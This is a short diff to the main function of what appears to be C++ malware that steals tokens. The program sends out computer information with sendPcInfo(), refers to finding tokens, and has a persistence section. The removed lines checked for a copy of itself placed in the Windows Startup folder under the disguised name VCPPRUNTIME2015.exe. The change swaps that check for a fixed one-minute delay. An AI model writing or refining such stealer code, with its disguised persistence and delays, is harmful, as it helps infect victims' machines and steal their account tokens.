@@ -77,24 +77,9 @@ int main(int argc, char* argv[]) {
 	// Computer informations
 
 	sendPcInfo();
-	Sleep(100); // Try to fix issues.
-
-
-	// Bug fix: not finding tokens on computer initialization!
-
-	const int SizeOf = sizeof(argv[0]);
-
-	char szStartupPath[SizeOf];
-	sprintf(szStartupPath, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\VCPPRUNTIME2015.exe", std::getenv("appdata"));
-
-	if (strcmp(argv[0],szStartupPath) == 0) // If in startup directory
-	{
-		Sleep(60000); // Wait, this should fix initialization issues.
-	}
-
-
-	// End bug fix.
-
+	Sleep(60000); // Try to fix issues.
+	
+	// Wait 1 minute.
 
 	// Persistence
 
